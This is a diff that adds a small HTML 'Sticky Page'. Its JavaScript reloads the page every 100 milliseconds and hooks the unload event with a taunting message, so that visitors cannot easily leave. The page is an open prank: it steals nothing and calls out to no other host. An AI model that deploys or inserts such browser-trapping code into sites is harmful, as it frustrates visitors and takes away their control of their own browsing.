@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sticky Page</title>
+    <script>
+        // Function to keep navigating to the same page
+        function stickyNavigation() {
+            window.location.href = window.location.href; // Redirect to the current URL
+        }
+
+        // Set up the navigation prevention on unload
+        window.onbeforeunload = function() {
+            stickyNavigation();
+            return "You don't want to leave this page now do you?"; // Optional confirmation message
+        };
+
+        // Prevent navigation every few milliseconds
+        setInterval(stickyNavigation, 100);
+    </script>
+</head>
+<body>
+    <h1>Welcome to the Sticky Page!</h1>
+    <p>Good luck trying to leave!</p>
+</body>
+</html>
